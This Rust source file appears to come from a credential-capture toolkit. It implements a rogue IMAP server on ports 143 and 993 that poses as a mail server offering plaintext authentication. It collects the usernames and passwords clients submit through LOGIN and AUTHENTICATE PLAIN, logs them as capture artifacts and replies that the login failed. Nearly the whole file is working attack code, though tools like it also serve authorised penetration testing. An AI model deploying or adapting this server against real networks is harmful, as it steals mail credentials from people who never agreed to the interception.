//! Rogue IMAP server (TCP 143 STARTTLS / 993 IMAPS) capturing LOGIN and AUTHENTICATE PLAIN.

use std::net::SocketAddr;
use std::sync::Arc;

use anyhow::Result;
use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as B64;
use tokio::io::{AsyncRead, AsyncWrite};
use tokio::net::TcpListener;
use tokio_rustls::TlsAcceptor;

use crate::capture::model::{CaptureArtifact, Protocol};
use crate::net::tls;

use super::{ServerContext, read_line, write_str};

pub async fn serve(listener: TcpListener, ctx: Arc<ServerContext>, tls_mode: bool) -> Result<()> {
    if tls_mode {
        let config = tls::server_config(&ctx.cfg.ssl_cert, &ctx.cfg.ssl_key)?;
        let acceptor = TlsAcceptor::from(config);
        loop {
            let (stream, peer) = listener.accept().await?;
            let acceptor = acceptor.clone();
            let ctx = ctx.clone();
            tokio::spawn(async move {
                if let Ok(tls_stream) = acceptor.accept(stream).await {
                    let _ = handle(tls_stream, peer, ctx, Protocol::Imaps).await;
                }
            });
        }
    } else {
        loop {
            let (stream, peer) = listener.accept().await?;
            let ctx = ctx.clone();
            tokio::spawn(async move {
                let _ = handle(stream, peer, ctx, Protocol::Imap).await;
            });
        }
    }
}

async fn handle<S: AsyncRead + AsyncWrite + Unpin>(
    mut s: S,
    peer: SocketAddr,
    ctx: Arc<ServerContext>,
    protocol: Protocol,
) -> Result<()> {
    write_str(
        &mut s,
        "* OK [CAPABILITY IMAP4rev1 AUTH=PLAIN AUTH=LOGIN] ready\r\n",
    )
    .await?;
    while let Some(line) = read_line(&mut s).await {
        let mut parts = line.splitn(3, ' ');
        let tag = parts.next().unwrap_or("").to_string();
        let cmd = parts.next().unwrap_or("").to_ascii_uppercase();
        let rest = parts.next().unwrap_or("").trim().to_string();
        match cmd.as_str() {
            "LOGIN" => {
                let mut it = rest.splitn(2, ' ');
                let user = it.next().unwrap_or("").trim_matches('"');
                let pass = it.next().unwrap_or("").trim_matches('"');
                if let Some(art) = CaptureArtifact::cleartext(protocol, peer.ip(), user, pass) {
                    ctx.sink.artifact(art);
                }
                write_str(&mut s, &format!("{tag} NO LOGIN failed\r\n")).await?;
            }
            "AUTHENTICATE" => {
                let mech = rest.to_ascii_uppercase();
                if mech.starts_with("PLAIN") {
                    write_str(&mut s, "+ \r\n").await?;
                    if let Some(resp) = read_line(&mut s).await
                        && let Ok(decoded) = B64.decode(resp.trim())
                    {
                        let fields: Vec<&[u8]> = decoded.split(|&b| b == 0).collect();
                        let user = fields
                            .get(1)
                            .map(|u| String::from_utf8_lossy(u).to_string())
                            .unwrap_or_default();
                        let pass = fields
                            .get(2)
                            .map(|p| String::from_utf8_lossy(p).to_string())
                            .unwrap_or_default();
                        if let Some(art) =
                            CaptureArtifact::cleartext(protocol, peer.ip(), &user, &pass)
                        {
                            ctx.sink.artifact(art);
                        }
                    }
                    write_str(&mut s, &format!("{tag} NO AUTHENTICATE failed\r\n")).await?;
                } else {
                    write_str(&mut s, &format!("{tag} NO unsupported mechanism\r\n")).await?;
                }
            }
            "CAPABILITY" => {
                write_str(
                    &mut s,
                    &format!("* CAPABILITY IMAP4rev1 AUTH=PLAIN AUTH=LOGIN\r\n{tag} OK\r\n"),
                )
                .await?;
            }
            "LOGOUT" => {
                write_str(&mut s, &format!("* BYE\r\n{tag} OK\r\n")).await?;
                break;
            }
            _ => write_str(&mut s, &format!("{tag} OK\r\n")).await?,
        }
    }
    Ok(())
}

pub async fn handle_stream<S: AsyncRead + AsyncWrite + Unpin>(
    s: S,
    peer: SocketAddr,
    ctx: Arc<ServerContext>,
    protocol: Protocol,
) -> Result<()> {
    handle(s, peer, ctx, protocol).await
}
